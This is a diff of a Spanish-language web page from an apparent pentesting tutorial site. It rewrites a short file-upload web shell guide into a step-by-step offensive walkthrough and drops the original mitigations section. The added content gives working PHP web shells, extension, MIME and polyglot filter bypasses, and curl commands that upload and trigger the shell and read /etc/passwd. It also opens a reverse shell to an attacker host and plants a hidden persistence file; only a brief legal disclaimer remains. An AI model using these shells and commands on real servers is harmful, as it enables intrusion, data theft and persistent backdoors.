@@ -3,123 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Subida de Web Shells: bypass de filtros, ejecución remota y mitigaciones. Guía educativa completa para pentesting seguro.">
-    <meta name="keywords" content="web shell, file upload, bypass, RCE, PHP shell, pentesting">
-    <title>Subida de Web Shell - Bypass y Mitigaciones | HackingUsef</title>
+    <meta name="description" content="Subida de Web Shells: técnicas de bypass, ejecución remota de comandos y explotación. Caso práctico con upload vulnerabilities.">
+    <meta name="keywords" content="web shell, file upload, bypass, RCE, PHP shell, pentesting, upload vulnerability">
+    <title>Subida de Archivo Malicioso (Web Shell) | HackingUsef</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
-    <!-- Matrix Rain Canvas -->
     <style>
-        /* Matrix Rain Background */
-        #matrix-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            background: linear-gradient(135deg, #000 0%, #001100 100%);
-        }
-        
-        /* Matrix Logo */
-        .matrix-logo {
-            display: inline-block;
-            color: #00FF00;
-            font-family: 'Courier New', monospace;
-            font-weight: bold;
-            text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00, 0 0 30px #00FF00;
-            animation: matrixGlow 2s ease-in-out infinite alternate;
-            background: linear-gradient(45deg, #00FF00, #00AA00, #00FF00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            position: relative;
-        }
-        
-        .matrix-logo::before {
-            content: '▶ ';
-            color: #00FF00;
-            animation: matrixBlink 1s infinite;
-        }
-        
-        .matrix-logo::after {
-            content: ' ◀';
-            color: #00FF00;
-            animation: matrixBlink 1s infinite reverse;
-        }
-        
-        @keyframes matrixGlow {
-            0% { text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00; }
-            100% { text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00, 0 0 30px #00FF00, 0 0 40px #00FF00; }
-        }
-        
-        @keyframes matrixBlink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0.3; }
-        }
-        
         :root {
-            --primary-color: #00FF00;
-            --secondary-color: #00FFFF;
-            --accent-color: #00AA00;
-            --dark-bg: #000000;
-            --darker-bg: #001100;
-            --card-bg: rgba(0, 20, 0, 0.8);
-            --text-primary: #00DD00;
-            --text-secondary: #00AA00;
-            --text-muted: #006600;
-            --border-color: #00FF00;
-            --code-bg: #000000;
-            --gradient-primary: linear-gradient(135deg, #00FF00 0%, #00FFFF 100%);
+            --primary-color: #00ff88;
+            --secondary-color: #ff6b35;
+            --accent-color: #7c3aed;
+            --dark-bg: #0a0a0a;
+            --darker-bg: #000000;
+            --card-bg: #1a1a1a;
+            --text-primary: #ffffff;
+            --text-secondary: #a0a0a0;
+            --text-muted: #666666;
+            --border-color: #333333;
+            --code-bg: #1e1e1e;
+            --gradient-primary: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Courier New', monospace !important; 
-            background: linear-gradient(135deg, #000 0%, #001100 25%, #000 50%, #001100 75%, #000 100%); 
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark-bg);
+            color: var(--text-primary);
+            line-height: 1.7;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .animated-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e);
             background-size: 400% 400%;
-            animation: matrixBackground 8s ease infinite;
-            color: var(--text-primary); 
-            line-height: 1.7; 
-            min-height: 100vh; 
-            overflow-x: hidden; 
+            animation: gradientShift 15s ease infinite;
         }
-        
-        @keyframes matrixBackground {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        
-        .animated-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e); background-size: 400% 400%; animation: gradientShift 15s ease infinite; }
         @keyframes gradientShift { 0% { background-position: 0% 50% } 50% { background-position: 100% 50% } 100% { background-position: 0% 50% } }
 
         .matrix-rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; opacity: 0.1; }
         .matrix-column { position: absolute; color: var(--primary-color); font-family: 'JetBrains Mono', monospace; font-size: 14px; animation: matrixFall linear infinite; }
         @keyframes matrixFall { 0% { transform: translateY(-100vh); opacity: 1 } 100% { transform: translateY(100vh); opacity: 0 } }
 
-        .container { 
-            max-width: 1000px; 
-            margin: 0 auto; 
-            padding: 2rem; 
-            position: relative; 
-            z-index: 1;
-            background: rgba(0, 20, 0, 0.85);
-            border: 2px solid #00FF00;
-            border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.1);
-            backdrop-filter: blur(5px);
-        }
+        .container { max-width: 1000px; margin: 0 auto; padding: 2rem; position: relative; z-index: 1; }
+
         .header { text-align: center; padding: 2rem 0 3rem; border-bottom: 1px solid var(--border-color); margin-bottom: 3rem; }
         .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--primary-color); text-decoration: none; margin-bottom: 2rem; font-size: 0.9rem; transition: all 0.3s ease; }
         .back-link:hover { transform: translateX(-5px); }
 
         .logo-container { position: relative; display: inline-block; margin-bottom: 2rem; }
-        .logo-matrix { width: 120px; height: 120px; background: var(--darker-bg); border: 2px solid var(--primary-color); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 1.8rem; font-weight: 700; color: var(--primary-color); box-shadow: 0 0 30px rgba(0, 255, 136, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden; }
+        .logo-matrix {
+            width: 120px; height: 120px; background: var(--darker-bg); border: 2px solid var(--primary-color); border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 1.8rem; font-weight: 700; color: var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden;
+        }
         .logo-matrix:hover { transform: scale(1.05) rotateX(5deg); box-shadow: 0 0 50px rgba(0, 255, 136, 0.5); }
         .logo-matrix::before { content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; background: linear-gradient(45deg, var(--primary-color), transparent, var(--primary-color)); border-radius: 12px; z-index: -1; animation: borderGlow 2s ease-in-out infinite alternate; }
         @keyframes borderGlow { 0% { opacity: .5 } 100% { opacity: 1 } }
@@ -127,40 +70,14 @@
         .logo-text::after { content: ''; position: absolute; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,.03) 2px, rgba(0,255,136,.03) 4px); animation: scanLines 2s linear infinite; }
         @keyframes scanLines { 0% { transform: translateY(-100%) } 100% { transform: translateY(100%) } }
 
-        h1, h2, h3, h4, h5, h6 {
-            color: #00FF00 !important;
-            text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00 !important;
-            font-family: 'Courier New', monospace !important;
-            border-bottom: 2px solid #00FF00 !important;
-            padding-bottom: 10px !important;
-        }
-        
-        h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 1rem; }
-        h1::before, h2::before {
-            content: '>>> ';
-            color: #00AA00;
-            animation: matrixBlink 1.5s infinite;
-        }
-        
-        .subtitle { 
-            font-size: 1.2rem; 
-            color: var(--text-primary) !important;
-            font-weight: 300;
-            font-family: 'Courier New', monospace !important;
-            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
-        }
+        h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 1rem; background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .subtitle { font-size: 1.2rem; color: var(--text-secondary); font-weight: 300; }
 
         .section { margin-bottom: 4rem; }
-        p { 
-            margin-bottom: 1.5rem; 
-            color: var(--text-primary) !important;
-            font-family: 'Courier New', monospace !important;
-            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
-            background: rgba(0, 15, 0, 0.3);
-            padding: 15px;
-            border-left: 3px solid #00FF00;
-            border-radius: 4px;
-        }
+        h2 { color: var(--primary-color); font-size: 1.8rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.8rem; }
+        h3 { color: var(--secondary-color); font-size: 1.4rem; margin: 2rem 0 1rem; }
+        h4 { color: var(--accent-color); font-size: 1.2rem; margin: 1.5rem 0 .8rem; }
+        p { margin-bottom: 1.5rem; color: var(--text-primary); }
 
         .alert { padding: 1.5rem; border-radius: 8px; margin: 2rem 0; border-left: 4px solid; }
         .alert-definition { background: rgba(0,255,136,.1); border-color: var(--primary-color); }
@@ -172,76 +89,300 @@
         .code-block code { font-family: 'JetBrains Mono', monospace; color: var(--primary-color); font-size: 0.95rem; white-space: pre; }
         .code-label { position: absolute; top: -12px; left: 1rem; background: var(--card-bg); color: var(--text-secondary); padding: .3rem .8rem; font-size: .8rem; border-radius: 4px; border: 1px solid var(--border-color); }
 
+        .example { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 2rem; margin: 3rem 0; }
+        .example-title { color: var(--secondary-color); font-size: 1.3rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: .5rem; }
+        .machine-info { background: rgba(124,58,237,.1); border: 1px solid var(--accent-color); border-radius: 6px; padding: 1rem; margin: 1rem 0; font-size: .9rem; }
+
+        .attack-flow { display: flex; flex-direction: column; gap: 1rem; margin: 2rem 0; }
+        .flow-step { display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--card-bg); border-radius: 8px; border-left: 4px solid var(--primary-color); }
+        .flow-number { background: var(--primary-color); color: var(--dark-bg); width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: .9rem; }
+        .flow-content { flex: 1; }
+        .flow-title { color: var(--primary-color); font-weight: 600; margin-bottom: .3rem; }
+        .flow-desc { color: var(--text-secondary); font-size: .9rem; }
+
         ul { margin-left: 1.5rem; margin-bottom: 1.5rem; }
         li { margin-bottom: .5rem; color: var(--text-primary); }
 
         .footer { text-align: center; padding: 3rem 0 2rem; border-top: 1px solid var(--border-color); margin-top: 4rem; color: var(--text-muted); }
 
-        @media (max-width: 768px) { .container { padding: 1rem; } h1 { font-size: 2.2rem; } .logo-matrix { width: 100px; height: 100px; font-size: 1.5rem; } }
+        @media (max-width: 768px) {
+            .container { padding: 1rem; }
+            h1 { font-size: 2.2rem; }
+            .logo-matrix { width: 100px; height: 100px; font-size: 1.5rem; }
+        }
     </style>
 </head>
 
 <body>
-    <!-- Matrix Rain Canvas -->
-    <canvas id="matrix-canvas"></canvas>
     <div class="animated-bg"></div>
+    <div class="matrix-rain" id="matrix-rain"></div>
 
     <div class="container">
         <header class="header">
-            <a href="../" class="back-link"><i class="fas fa-arrow-left"></i>Volver al inicio</a>
+            <a href="../" class="back-link">
+                <i class="fas fa-arrow-left"></i>
+                Volver al inicio
+            </a>
             <div class="logo-container">
-                <div class="logo-matrix"><div class="logo-text">&lt;/&gt;</div></div>
+                <div class="logo-matrix">
+                    <div class="logo-text">&lt;/&gt;</div>
+                </div>
             </div>
-            <h1><span class="matrix-logo">SUBIDA DE WEB SHELL</span></h1>
-            <p class="subtitle">Bypass de Filtros y Ejecución Remota de Código</p>
+            <h1>Subida de Archivo Malicioso (Web Shell)</h1>
+            <p class="subtitle">Bypass de Filtros, Ejecución Remota y Post-Explotación</p>
         </header>
 
         <main>
             <section class="section">
-                <h2><i class="fas fa-bug"></i>¿Qué es una Web Shell?</h2>
+                <h2><i class="fas fa-upload"></i>¿Qué es una Web Shell?</h2>
+                
                 <div class="alert alert-definition">
-                    <p>Una <strong>web shell</strong> es un script malicioso subido a un servidor web que permite ejecutar comandos remotamente. Se utiliza para <strong>RCE</strong>, exfiltración y movimiento lateral tras comprometer funcionalidades de upload.</p>
+                    <p><strong>Definición:</strong> Una Web Shell es un script malicioso que se sube a un servidor web vulnerable, permitiendo <strong>ejecución remota de comandos (RCE)</strong> a través de una interfaz web. Actúa como una backdoor persistente que facilita el control total del servidor comprometido, permitiendo navegación del filesystem, ejecución de comandos del sistema y escalación de privilegios.</p>
                 </div>
-                
-                <h3>Vectores de Ataque</h3>
+
+                <h3>Requisitos para que sea vulnerable:</h3>
                 <ul>
-                    <li>Validación débil de extensiones</li>
-                    <li>Confianza en Content-Type manipulable</li>
-                    <li>Subidas en directorios ejecutables</li>
-                    <li>Falta de análisis de contenido real</li>
+                    <li>Funcionalidad de <em>file upload</em> sin validación adecuada</li>
+                    <li>Directorio de subida con permisos de <strong>ejecución</strong> habilitados</li>
+                    <li>Falta de filtros de extensión o <strong>bypass</strong> de los existentes</li>
+                    <li>Ausencia de análisis de contenido del archivo</li>
                 </ul>
-            </section>
 
-            <section class="section">
-                <h2><i class="fas fa-mask"></i>Técnicas de Bypass</h2>
-                
-                <div class="code-block">
-                    <div class="code-label">Extensiones y MIME</div>
-                    <code># Extensiones dobles
-shell.php.jpg
-
-# Case variations
-shell.PHP
-
-# Content-Type forzado
-curl -F "file=@shell.php;type=image/jpeg" target/upload</code>
+                <div class="alert alert-danger">
+                    <p><strong>Impacto:</strong> Compromiso total del servidor web, acceso al sistema operativo, exfiltración de datos, instalación de backdoors y posible movimiento lateral en la red interna.</p>
                 </div>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-shield-alt"></i>Mitigaciones</h2>
+                <h2><i class="fas fa-server"></i>Caso Práctico: Upload Bypass en Aplicación Web</h2>
+
+                <div class="example">
+                    <div class="example-title">
+                        <i class="fas fa-upload"></i>
+                        Subida de Web Shell PHP - Bypass de Filtros y Post-Explotación
+                    </div>
+
+                    <div class="machine-info">
+                        <strong>Escenario del ataque:</strong>
+                        <ul>
+                            <li><strong>Objetivo:</strong> Subir una web shell PHP funcional y obtener RCE</li>
+                            <li><strong>Funcionalidad:</strong> Upload form con validación débil de archivos</li>
+                            <li><strong>Herramientas:</strong> Burp Suite, curl, editores hex, shells PHP personalizadas</li>
+                            <li><strong>Resultado esperado:</strong> Ejecución remota de comandos del sistema y persistencia</li>
+                        </ul>
+                    </div>
+
+                    <h4>Metodología de Explotación:</h4>
+                    <div class="attack-flow">
+                        <div class="flow-step">
+                            <div class="flow-number">1</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Reconocimiento</div>
+                                <div class="flow-desc">Identificación de funcionalidades de upload y análisis de restricciones</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">2</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Bypass de Filtros</div>
+                                <div class="flow-desc">Evasión de validaciones de extensión, MIME type y análisis de contenido</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">3</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Subida Exitosa</div>
+                                <div class="flow-desc">Upload exitoso de web shell PHP con técnicas de bypass</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">4</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Activación RCE</div>
+                                <div class="flow-desc">Acceso a la shell subida y verificación de ejecución de comandos</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">5</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Post-Explotación</div>
+                                <div class="flow-desc">Enumeración del sistema, escalación de privilegios y persistencia</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h4>Fase 1: Reconocimiento y Análisis de Upload</h4>
+                    <div class="code-block">
+                        <div class="code-label">Identificación de funcionalidades</div>
+                        <code># Buscar formularios de upload
+grep -r "type=\"file\"" /var/www/html/
+grep -r "enctype=\"multipart" .
+
+# Analizar validaciones client-side
+view-source: # Revisar JavaScript de validación
+
+# Interceptar con Burp Suite
+burpsuite -> HTTP History -> Analizar POST requests</code>
+                    </div>
+                    <div class="alert alert-info">
+                        <p>Identificamos formulario de upload que aparentemente <strong>valida extensión client-side</strong> y permite subida a directorio ejecutable <strong>/uploads/</strong>.</p>
+                    </div>
+
+                    <h4>Fase 2: Creación de Web Shells</h4>
+                    <div class="code-block">
+                        <div class="code-label">PHP Web Shell Básica</div>
+                        <code># Shell mínima funcional
+cat > shell.php <<'EOF'
+&lt;?php
+if(isset($_GET['cmd'])) {
+    echo "&lt;pre>";
+    system($_GET['cmd']);
+    echo "&lt;/pre>";
+}
+?>
+EOF
+
+# Web Shell con interfaz completa
+cat > webshell.php <<'EOF'
+&lt;?php
+echo "&lt;h2>Web Shell Access&lt;/h2>";
+echo "&lt;form method='GET'>&lt;input type='text' name='cmd' placeholder='Enter command'>&lt;input type='submit' value='Execute'>&lt;/form>";
+if(isset($_GET['cmd'])) {
+    echo "&lt;pre>";
+    passthru($_GET['cmd']);
+    echo "&lt;/pre>";
+}
+?>
+EOF</code>
+                    </div>
+
+                    <h4>Fase 3: Técnicas de Bypass Avanzadas</h4>
+                    <div class="code-block">
+                        <div class="code-label">Bypass de extensiones</div>
+                        <code># Extensión doble (.php.jpg)
+cp shell.php shell.php.jpg
+
+# Null byte injection (PHP &lt; 5.3)
+cp shell.php shell.php%00.jpg
+
+# Case sensitivity bypass
+cp shell.php shell.PHP
+cp shell.php shell.PhP
+cp shell.php shell.pHp
+
+# Extensiones alternativas PHP
+cp shell.php shell.phtml
+cp shell.php shell.php5
+cp shell.php shell.phar
+cp shell.php shell.inc</code>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-label">Bypass MIME Type y Magic Bytes</div>
+                        <code># Modificar Content-Type con curl
+curl -X POST -F "file=@shell.php;type=image/jpeg" \
+     -F "submit=Upload" http://target.com/upload.php
+
+# Polyglot con magic bytes de imagen
+echo -ne "\xFF\xD8\xFF\xE0\x00\x10JFIF" > shell.jpg
+echo '&lt;?php system($_GET["cmd"]); ?>' >> shell.jpg
+
+# GIF header polyglot
+echo 'GIF89a&lt;?php system($_GET["cmd"]); ?>' > shell.gif
+
+# PNG header + PHP payload
+printf "\x89PNG\r\n\x1a\n&lt;?php system(\$_GET['cmd']); ?>" > shell.png</code>
+                    </div>
+
+                    <h4>Fase 4: Upload y Activación</h4>
+                    <div class="code-block">
+                        <div class="code-label">Proceso de subida</div>
+                        <code># Upload con bypass exitoso
+curl -X POST \
+     -F "file=@shell.php.jpg;type=image/jpeg" \
+     -F "submit=Upload" \
+     http://target.com/upload.php
+
+# Verificar ubicación del archivo
+curl -s http://target.com/uploads/ | grep -i shell
+
+# Activar web shell y verificar RCE
+curl "http://target.com/uploads/shell.php.jpg?cmd=whoami"
+curl "http://target.com/uploads/shell.php.jpg?cmd=id"
+curl "http://target.com/uploads/shell.php.jpg?cmd=uname -a"
+curl "http://target.com/uploads/shell.php.jpg?cmd=pwd"</code>
+                    </div>
+
+                    <div class="alert alert-warning">
+                        <p>Si el servidor procesa archivos <strong>.jpg</strong> como PHP (AddHandler) o permite <strong>double extension</strong>, la shell será ejecutable y tendremos RCE completo.</p>
+                    </div>
+
+                    <h4>Fase 5: Post-Explotación Sistemática</h4>
+                    <div class="code-block">
+                        <div class="code-label">Enumeración y escalación</div>
+                        <code># Enumeración básica del sistema
+curl "http://target.com/uploads/shell.php.jpg?cmd=ls -la /var/www/html"
+curl "http://target.com/uploads/shell.php.jpg?cmd=cat /etc/passwd"
+curl "http://target.com/uploads/shell.php.jpg?cmd=ps aux"
+curl "http://target.com/uploads/shell.php.jpg?cmd=netstat -tulpn"
+
+# Buscar archivos de configuración
+curl "http://target.com/uploads/shell.php.jpg?cmd=find /var/www -name '*.conf' -o -name 'config.*'"
+
+# Establecer reverse shell
+listener: nc -nlvp 4444
+curl "http://target.com/uploads/shell.php.jpg?cmd=bash -c 'bash -i >%26 /dev/tcp/attacker-ip/4444 0>%261'"
+
+# Crear persistencia adicional
+curl "http://target.com/uploads/shell.php.jpg?cmd=cp shell.php.jpg /var/www/html/.hidden.php"</code>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <p><strong>Resultado:</strong> RCE completo obtenido, acceso interactivo al servidor mediante reverse shell, capacidad de enumeración del sistema y establecimiento de múltiples puntos de persistencia.</p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-toolbox"></i>Técnicas Avanzadas y Variantes</h2>
+                <h3>Métodos de bypass sofisticados</h3>
                 <ul>
-                    <li>Allowlist estricta de extensiones</li>
-                    <li>Validación MIME real del contenido</li>
-                    <li>Almacenamiento fuera del docroot</li>
-                    <li>Deshabilitar ejecución en directorios upload</li>
+                    <li><strong>Path Traversal Upload:</strong> Subida usando ../../../var/www/html/shell.php</li>
+                    <li><strong>ZIP Upload + Path Traversal:</strong> Crear archivo ZIP con path traversal interno</li>
+                    <li><strong>EXIF Data Injection:</strong> Inyección de PHP en metadatos de imágenes</li>
+                    <li><strong>Server Config Abuse:</strong> Subida de .htaccess, .user.ini para ejecutar código</li>
+                    <li><strong>Polyglot Files:</strong> Archivos válidos como imagen y ejecutables como PHP</li>
                 </ul>
-                
+
+                <h3>Web Shells especializadas</h3>
                 <div class="code-block">
-                    <div class="code-label">Apache .htaccess</div>
-                    <code>php_flag engine off
-RemoveHandler .php .phtml
-ForceType application/octet-stream</code>
+                    <div class="code-label">Shells avanzadas</div>
+                    <code># Shell con múltiples funciones
+cat > advanced_shell.php <<'EOF'
+&lt;?php
+if(isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+    if($cmd == 'upload') {
+        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+        echo "File uploaded: " . $_FILES['file']['name'];
+    } else {
+        echo "&lt;pre>" . shell_exec($cmd) . "&lt;/pre>";
+    }
+}
+?>
+&lt;form method="post" enctype="multipart/form-data">
+&lt;input type="text" name="cmd" placeholder="Command or 'upload'">
+&lt;input type="file" name="file">
+&lt;input type="submit" value="Execute">
+&lt;/form>
+EOF</code>
+                </div>
+            </section>
+
+            <section class="section">
+                <h2><i class="fas fa-exclamation-triangle"></i>Consideraciones Éticas y Legales</h2>
+                <div class="alert alert-danger">
+                    <p><strong>Advertencia Legal:</strong> Este contenido es exclusivamente educativo. Aplica estas técnicas únicamente en sistemas propios, entornos de pentesting autorizados por contrato, laboratorios controlados o con autorización explícita por escrito del propietario.</p>
                 </div>
             </section>
 
@@ -258,117 +399,23 @@ ForceType application/octet-stream</code>
         </footer>
     </div>
 
-    <!-- Matrix Rain Animation Script -->
     <script>
-    // Matrix Rain Effect
-    class MatrixRain {
-        constructor() {
-            this.canvas = document.getElementById('matrix-canvas');
-            this.ctx = this.canvas.getContext('2d');
-            
-            this.canvas.width = window.innerWidth;
-            this.canvas.height = window.innerHeight;
-            
-            this.katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
-            this.latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
-            this.nums = '0123456789';
-            this.alphabet = this.katakana + this.latin + this.nums;
-            
-            this.fontSize = 16;
-            this.columns = this.canvas.width / this.fontSize;
-            
-            this.rainDrops = [];
-            
-            for(let x = 0; x < this.columns; x++) {
-                this.rainDrops[x] = 1;
-            }
-            
-            this.draw();
-            
-            window.addEventListener('resize', () => this.handleResize());
-        }
-        
-        draw() {
-            this.ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
-            
-            this.ctx.fillStyle = '#00FF00';
-            this.ctx.font = this.fontSize + 'px monospace';
-            
-            for(let i = 0; i < this.rainDrops.length; i++) {
-                const text = this.alphabet.charAt(Math.floor(Math.random() * this.alphabet.length));
-                
-                this.ctx.shadowColor = '#00FF00';
-                this.ctx.shadowBlur = 10;
-                
-                this.ctx.fillText(text, i * this.fontSize, this.rainDrops[i] * this.fontSize);
-                
-                this.ctx.shadowBlur = 0;
-                
-                if(this.rainDrops[i] * this.fontSize > this.canvas.height && Math.random() > 0.975) {
-                    this.rainDrops[i] = 0;
-                }
-                this.rainDrops[i]++;
-            }
-            
-            requestAnimationFrame(() => this.draw());
-        }
-        
-        handleResize() {
-            this.canvas.width = window.innerWidth;
-            this.canvas.height = window.innerHeight;
-            this.columns = this.canvas.width / this.fontSize;
-            
-            this.rainDrops = [];
-            for(let x = 0; x < this.columns; x++) {
-                this.rainDrops[x] = 1;
+        function createMatrixRain() {
+            const container = document.getElementById('matrix-rain');
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            for (let i = 0; i < 50; i++) {
+                const column = document.createElement('div');
+                column.className = 'matrix-column';
+                column.style.left = Math.random() * 100 + '%';
+                column.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                column.style.animationDelay = Math.random() * 2 + 's';
+                let text = '';
+                for (let j = 0; j < 20; j++) text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
+                column.innerHTML = text;
+                container.appendChild(column);
             }
         }
-    }
-    
-    // Initialize Matrix Rain when DOM is loaded
-    document.addEventListener('DOMContentLoaded', () => {
-        new MatrixRain();
-    });
-    
-    // Add matrix-style typing effect to headers
-    document.addEventListener('DOMContentLoaded', () => {
-        const headers = document.querySelectorAll('h1, h2, h3, h4, h5, h6');
-        
-        headers.forEach((header, index) => {
-            setTimeout(() => {
-                header.style.opacity = '0';
-                header.style.transform = 'translateY(20px)';
-                header.style.transition = 'all 0.6s ease';
-                
-                setTimeout(() => {
-                    header.style.opacity = '1';
-                    header.style.transform = 'translateY(0)';
-                }, 100);
-            }, index * 200);
-        });
-    });
-    
-    // Add matrix-style fade-in effect for content
-    document.addEventListener('DOMContentLoaded', () => {
-        const elements = document.querySelectorAll('p, .alert, .code-block');
-        
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
-                }
-            });
-        });
-        
-        elements.forEach(el => {
-            el.style.opacity = '0';
-            el.style.transform = 'translateY(30px)';
-            el.style.transition = 'all 0.8s ease';
-            observer.observe(el);
-        });
-    });
+        document.addEventListener('DOMContentLoaded', createMatrixRain);
     </script>
 </body>
 </html>
